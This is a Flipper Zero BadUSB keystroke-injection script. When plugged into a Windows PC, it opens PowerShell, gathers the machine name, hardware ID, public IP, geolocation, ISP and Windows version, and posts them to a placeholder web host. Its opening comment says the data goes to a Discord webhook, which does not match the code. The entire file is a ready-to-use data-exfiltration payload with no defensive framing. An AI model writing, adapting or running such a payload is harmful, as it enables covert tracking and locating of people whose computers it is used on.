REM Flipper Zero Script to pull IP/HWID/LOCATION Etc of PC and sends a Discord Webhook
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 500
STRING $pcname = $env:COMPUTERNAME; $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID; $ipinfo = Invoke-RestMethod -Uri http://ipinfo.io/json; $ip = $ipinfo.ip; $hostname = $ipinfo.hostname; $city = $ipinfo.city; $region = $ipinfo.region; $loc = $ipinfo.loc; $org = $ipinfo.org; $postal = $ipinfo.postal; $timezone = $ipinfo.timezone; $winver = (Get-ComputerInfo).WindowsProductName + ' ' + (Get-ComputerInfo).WindowsVersion; $date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; $body = @{pcname = $pcname; hwid = $hwid; ip = $ip; hostname = $hostname; city = $city; region = $region; loc = $loc; org = $org; postal = $postal; timezone = $timezone; winver = $winver; date = $date}; Invoke-WebRequest -Uri 'http://yourdomain.com/yourscript.php' -Method Post -Body $body; exit
ENTER
